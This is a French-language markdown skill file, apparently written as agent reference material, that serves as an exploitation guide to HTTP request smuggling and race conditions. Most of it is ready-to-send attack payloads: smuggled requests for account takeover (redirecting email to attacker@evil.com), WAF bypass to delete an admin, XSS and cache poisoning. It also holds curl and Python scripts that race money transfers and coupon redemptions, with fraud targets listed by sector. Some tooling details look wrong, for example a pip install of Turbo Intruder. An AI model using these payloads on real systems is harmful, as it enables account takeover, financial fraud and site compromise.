---
name: http-request-smuggling
description: Guide complet d'exploitation HTTP Request Smuggling et Race Conditions — CL.TE, TE.CL, TE.TE, HTTP/2 desync, tools et payloads
category: cybersecurite
---

# HTTP Request Smuggling & Race Conditions

## HTTP Request Smuggling

### Principe
Deux serveurs (Frontend LB/Proxy + Backend) interprètent différemment les limites de requête HTTP (Content-Length vs Transfer-Encoding). L'attaquant fait "avaler" une requête au frontend pour la faire traiter comme nouvelle requête par le backend.

### Techniques Fondamentales

#### CL.TE (Content-Length vs Transfer-Encoding)
```http
# Le frontend utilise Content-Length
# Le backend utilise Transfer-Encoding

POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**Explication:**
- Frontend voit CL=13, lit tout (y compris `0\r\n\r\nSMUGGLED`) comme 1 requête
- Backend voit TE, s'arrête au `0` (chunk terminator), traite `SMUGGLED` comme nouvelle requête

#### TE.CL (Transfer-Encoding vs Content-Length)
```http
# Le frontend utilise Transfer-Encoding
# Le backend utilise Content-Length

POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST /admin HTTP/1.1
Host: target.com
Content-Length: 15

x=1
0

```

**Explication:**
- Frontend voit TE, lit le chunk (5c octets GPOST...x=1) puis `0` → termine
- Backend voit CL=4, ne lit que `5c\r\n`, traite `GPOST...` comme nouvelle requête

#### TE.TE (Transfer-Encoding ambigu)
```http
# Les deux serveurs supportent TE mais un seul voit l'ambiguïté

POST / HTTP/1.1
Host: target.com
Transfer-Encoding: xchunked

0

SMUGGLED
```

**Variantes d'obfuscation TE:**
```
Transfer-Encoding: chunked
Transfer-Encoding: xchunked
Transfer-Encoding: chunked\r\nTransfer-Encoding: identity
Transfer-encoding: chunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-encoding: x
Transfer-encoding:[tab]chunked
\x00Transfer-Encoding: chunked
```

### HTTP/2 Downgrade Desync
```bash
# HTTP/2 → HTTP/1.1 downgrade
# Les caractères illégaux en HTTP/1.1 (newlines) sont souvent ignorés en HTTP/2

:method POST
:path /admin
:authority target.com
content-type application/x-www-form-urlencoded
content-length 0

GET /admin HTTP/1.1
Host: target.com
```

### Détection

**Detection CL.TE:**
```bash
# Envoyer avec minuterie — si timeout, le backend attend un nouveau chunk
time curl -v -k https://target.com \
  -H "Transfer-Encoding: chunked" \
  -d "0\r\n\r\nG"
```

**Detection TE.CL:**
```bash
# Réponse à une requête qui n'existe pas
curl -v -k https://target.com \
  -H "Content-Length: 4" \
  -H "Transfer-Encoding: chunked" \
  -d "5c\r\nGPOST /404 HTTP/1.1\r\nContent-Length: 15\r\n\r\nx=1"
```

### Outils
```bash
# BurpSuite HTTP Request Smuggler (Turbo Intruder)
# Installer l'extension "HTTP Request Smuggler" dans Burp

# Turbo Intruder — script automatisé
pip install turbo-intruder

# Smuggler.py
git clone https://github.com/defparam/smuggler
python smuggler.py -u https://target.com
```

### Exploitation

#### 1. User-Specific Request Smuggling
```http
# Cibler un utilisateur spécifique
POST / HTTP/1.1
Host: target.com
Content-Length: 0
Transfer-Encoding: chunked

GET /account/dashboard HTTP/1.1
Host: target.com
Cookie: session=attacker-session
```

#### 2. Account Takeover via Smuggling
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 0
Transfer-Encoding: chunked

POST /email/change HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 40

email=attacker@evil.com
```

#### 3. WAF Bypass via Smuggling
```http
# Smuggler une requête malveillante derrière une requête clean
POST / HTTP/1.1
Host: target.com
Content-Length: 0
Transfer-Encoding: chunked

GET /admin/delete?user=admin HTTP/1.1
Host: target.com
```

#### 4. XSS via Smuggling
```http
# Injecter un en-tête XSS
POST / HTTP/1.1
Host: target.com
Content-Length: 0
Transfer-Encoding: chunked

GET /search HTTP/1.1
Host: target.com
Cookie: session=attacker
User-Agent: "><script>alert(1)</script>
```

#### 5. Cache Poisoning via Smuggling
```http
# Faire cache une page malveillante pour tous les utilisateurs
POST / HTTP/1.1
Host: target.com
Content-Length: 0
Transfer-Encoding: chunked

GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
```

## Race Conditions

### Types de Race Conditions

#### 1. Race Condition Classique (TOCTOU)
```bash
# Time-of-Check Time-of-Use
# Vérification de solde → débit

# Envoyer N requêtes simultanées
for i in {1..50}; do
  curl -X POST https://target.com/api/transfer \
    -d "to=attacker&amount=100" &
done
wait
```

#### 2. Race via Parallel HTTP/2 Streams
```bash
# HTTP/2 permet des streams parallèles
# Contourne les protections basées sur IP

# Utiliser Burp Turbo Intruder ou httpx
```

#### 3. Race sur les Coupons/Rewards
```bash
# Envoyer N requêtes de coupon simultanément
# Une seule devrait passer, mais race condition = N passes

python -c "
import requests, threading
url = 'https://target.com/api/redeem'
def redeem():
    requests.post(url, json={'code': 'FREEGIFT'})
threads = [threading.Thread(target=redeem) for _ in range(100)]
for t in threads: t.start()
for t in threads: t.join()
"
```

### Détection de Race Condition

```bash
# BurpSuite Turbo Intruder
# Mode: battering ram
# Race condition: envoyer un lot en même temps avec l'extension

# Utiliser des timestamps précis
curl -v --parallel --parallel-immediate \
  -X POST https://target.com/api/coupon \
  -d "code=FREE23" \
  -X POST https://target.com/api/coupon \
  -d "code=FREE23"
```

### Exploitation par Secteur

**E-commerce:**
```bash
# Coupon/Reward double utilisation
# Prix modifié entre vérification et paiement
# Stock négatif
# Achat multiple d'items limités à 1
```

**Fintech:**
```bash
# Double retrait
# Double transfert
# Solde négatif
# Investissement multiple avant vérification
```

**Voting/Rate:**
```bash
# Double vote
# Multiple rate
# Subscription bypass
```

### Outils Race Condition

| Outil | Description |
|-------|-------------|
| **Burp Turbo Intruder** | Race condition via HTTP pipelining |
| **Python threading** | Multi-thread pour requêtes parallèles |
| **Curl –parallel** | Requêtes parallèles natives |
| **HTTPie** | –parallel support |
| **httpx** | Requêtes HTTP/2 parallèles |
| **SinglePacket Attack** | Toutes les requêtes dans un seul paquet TCP |

### Single-Packet Attack (HTTP/2)
```bash
# Envoyer TOUTES les requêtes dans un SEUL paquet TCP
# Contourne la plupart des protections

# Avec Burp: utiliser l'extension "Race Single Packet"
# Avec curl + HTTP/2
curl --http2 -X POST https://target.com/api/action \
  -d "data=test" \
  --next --http2 -X POST https://target.com/api/action \
  -d "data=test"
```

## Ressources

- **HackTricks Request Smuggling**: https://book.hacktricks.wiki/en/pentesting-web/http-request-smuggling/index.html
- **PortSwigger Research**: https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
- **Turbo Intruder**: https://github.com/PortSwigger/turbo-intruder
- **Smuggler**: https://github.com/defparam/smuggler
- **PortSwigger Race Conditions**: https://portswigger.net/web-security/race-conditions
- **PayloadsAllTheThings Race**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Race%20Condition